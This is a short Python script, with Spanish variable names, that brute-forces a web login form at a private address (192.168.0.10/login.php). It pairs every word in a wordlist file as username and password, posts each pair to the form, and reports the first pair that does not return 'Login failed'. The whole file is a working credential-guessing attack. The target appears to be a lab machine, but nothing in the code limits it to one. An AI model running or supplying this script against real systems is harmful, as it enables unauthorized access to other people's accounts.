import requests

url = "http://192.168.0.10/login.php"

diccionario = open("diccionario.txt", "r").readlines()

conjunto = [[x[:-1], y[:-1]] for x in diccionario for y in diccionario]

for c in conjunto:
    username = c[0]
    password = c[1]
    payload = {"username": username, "password": password, "Login": "submit"}
    r = requests.post(url, data=payload)

    if "Login failed" in str(r.content):
        print("[+] Attempting Username: {} Password: {}".format(username, password))
    else:
        print("[+] Found Username: {} Password: {}".format(username, password))
        break

